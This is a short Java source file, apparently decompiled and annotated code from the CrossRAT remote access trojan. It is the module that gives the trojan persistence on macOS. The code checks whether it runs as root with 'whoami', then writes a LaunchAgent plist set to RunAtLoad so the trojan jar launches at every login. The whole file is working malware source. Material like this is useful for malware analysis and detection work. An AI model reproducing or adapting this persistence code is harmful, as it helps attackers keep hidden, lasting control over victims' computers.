package persistence;

import java.io.*;

// OSX persistence.
public final class c extends a {
    public c(String var1, String var2, boolean var3) {
        super(var1, var2, var3);
    }

    // Figure out where to install. If root, install at /Library/..., otherwise at user home dir.
    private static File b() {
        String var0 = System.getProperty("user.home");
        try {
            if (osprobe.c.b().a() != osprobe.c.a && (new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream()))).readLine().equals("root")) {
                var0 = "";
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return new File(var0 + "/Library/LaunchAgents/");
    }

    public final void a() {
        if (!b().exists()) {
            b().mkdirs();
        }

        // Create the .plist file to autostart crossRAT.
        File var1 = new File(b(), super.b + ".plist");
        PrintWriter var2;
        try {
            (var2 = new PrintWriter(new FileWriter(var1))).println("<plist version=\"1.0\">");
            var2.println("<dict>");
            var2.println("\t<key>Label</key>");
            var2.println("\t<string>" + super.b + "</string>");
            var2.println("\t<key>ProgramArguments</key>");
            var2.println("\t<array>");
            if (this.a) {
                var2.println("\t\t<string>java</string>");
                var2.println("\t\t<string>-jar</string>");
            }

            var2.println("\t\t<string>" + super.c + "</string>");
            var2.println("\t</array>");
            var2.println("\t<key>RunAtLoad</key>");
            var2.println("\t<true/>");
            var2.println("</dict>");
            var2.println("</plist>");
            var2.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
